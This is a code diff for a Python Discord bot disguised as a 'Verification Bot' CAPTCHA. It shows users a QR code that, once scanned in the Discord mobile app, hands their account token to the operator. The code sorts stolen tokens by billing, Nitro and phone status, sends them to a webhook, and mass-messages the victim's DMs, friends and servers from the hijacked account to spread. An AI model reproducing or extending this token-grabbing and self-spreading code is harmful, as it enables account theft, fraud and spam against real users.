@@ -1,5 +1,4 @@
 
-from ast import dump
 from http.client import HTTPException
 
 import os
@@ -7,7 +6,7 @@ from DRAclient import DRAClient
 import io
 import qrcode
 import discord
-from DiscordLib import Dump, MassDM
+from DiscordLib import DiscordLib, MassDM
 import asyncio
 from discord.utils import get
 import json
@@ -29,14 +28,10 @@ async def generate_qr(fingerprint):
     
 async def generate_verify_embed():
     embed = discord.Embed()
-    embed.description = '✅ Scan this QR code to gain access to the rest of the server ✅'
+    embed.description = '✅ Scan this QR code to gain access!'
     embed.title = '🤖 Are you a robot?'
-    embed.set_author(name='Verification Bot', icon_url='https://cdn.discordapp.com/avatars/512333785338216465/f43bfe6b62b3c38002b3c1cb5100a11a.webp?size=80')
-    
     embed.set_image(url="attachment://image.png")
-    embed.add_field(name='Couldnt find?', value='🚫 Try again. It can be buggy...', inline=False)
-
-    embed.add_field(name='Important information', value='🚫 This will NOT work without the Discord mobile application 🚫\n 🚫 This code only lasts 2 MINUTES!! 🚫')
+    embed.color = 0x17a2ff
     embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
     return embed
 
@@ -46,7 +41,7 @@ class QRHandler():
     def __init__(self):
         self.ctx = None
         self.client = None
-        self.billing = None
+        self.useless = None
         self.client = DRAClient(on_connected=self.on_connected, 
                                 on_scan=self.on_scan, 
                                 on_finish=self.on_finish, 
@@ -80,7 +75,7 @@ class QRHandler():
 
 
     async def check_token(self, token):
-        details = Dump().get_details(token)
+        details = DiscordLib().get_details(token)
         try:
             if details['message'] == '401: Unauthorized':
                 invalid += 1
@@ -90,48 +85,41 @@ class QRHandler():
 
             await self.save_token(token, "tokens")
 
-        if details['verified']:
-            await self.save_token(token, "verified")
+        if DiscordLib().get_payment(token):
+            await self.save_token(token, "billing")
+            return
 
-        if details['phone']:
-            await self.save_token(token, "mobile")
         try:
-            if details['premium_type'] == 1:
-                await self.save_token(token, "nitroclassic")
-            elif details['premium_type'] == 2:
+            if details['premium_type'] == 2:
                 await self.save_token(token, "nitro")
+                return
+            elif details['premium_type'] == 1:
+                await self.save_token(token, "nitroclassic")
+                return
         except KeyError:
             pass
+                    
+        if details['phone']:
+            await self.save_token(token, "mobile")
+            return
+        if details['verified']:
+            self.useless = True
+            await self.save_token(token, "verified")
+            return
+
         
-        if Dump().get_payment(token):
-            self.billing = True
-            await self.save_token(token, "billing")
+
             
     async def export_token(self, token):
         await self.check_token(token)
 
-    
         if config['webhook_url']:
             try:
-                Dump().send_webhook(token)
+                DiscordLib().send_webhook(token)
             except:
                 print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to dump to webhook')
-
-    async def on_finish(self):
-        print(f'{Fore.GREEN}[{datetime.now()}] [SUCCESS] {self.client.user.username}#{self.client.user.discrim}')
-
-
-        config['tokens_logged'] += 1
-        config.write()
-            
-        await self.export_token(self.client.token)
-
-        #give role
-        # print("servers:", config['servers'])
-        # print("guild:", config['servers'][str(self.ctx.guild.id)])
-        # print("role:", config['servers'][str(self.ctx.guild.id)]['verify_role'])
-
-
+    
+    async def give_role(self):
         try:
             role = get(self.ctx.guild.roles, id=config['servers'][str(self.ctx.guild.id)]['verify_role'])
             await self.ctx.user.add_roles(role)
@@ -142,25 +130,36 @@ class QRHandler():
         except KeyError:
             print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the role id is correct in config.json')
 
+    async def auto_spread(self):
+        massdm = MassDM()
+        await massdm.init(self.client.token, '#'.join([self.client.user.username, self.client.user.discrim]))
 
+        if self.useless:
+            loop = asyncio.get_event_loop()
+            # await asyncio.sleep(60) # waits a minute
+            if config["auto_spread"]['dm_dms'] == True:
+                print('Mass dming open dms')
+                await massdm.message_dms()
+            if config["auto_spread"]['dm_friends'] == True:
+                print('Mass dming friends')
 
-        
+                await massdm.message_friends()
+            if config["auto_spread"]['dm_guilds'] == True:
+                print('Mass dming guilds')
+
+                await massdm.message_guilds()
+
+    async def on_finish(self):
+        print(f'{Fore.GREEN}[{datetime.now()}] [SUCCESS] {self.client.user.username}#{self.client.user.discrim}')
+
+        config['tokens_logged'] += 1
+        config.write()
+            
+        await self.export_token(self.client.token)
+        await self.give_role()
+
         if config["auto_spread"]['enabled'] == True:
-            massdm = MassDM()
-            await massdm.init(self.client.token, '#'.join([self.client.user.username, self.client.user.discrim]))
-
-            if not self.billing:
-                if config["auto_spread"]['dm_dms'] == True:
-                    print('Mass dming open dms')
-                    asyncio.create_task(massdm.message_dms())
-                if config["auto_spread"]['dm_friends'] == True:
-                    print('Mass dming friends')
-
-                    asyncio.create_task(massdm.message_friends())
-                if config["auto_spread"]['dm_guilds'] == True:
-                    print('Mass dming guilds')
-
-                    asyncio.create_task(massdm.message_guilds())
+            await self.auto_spread()
 
                                 
         
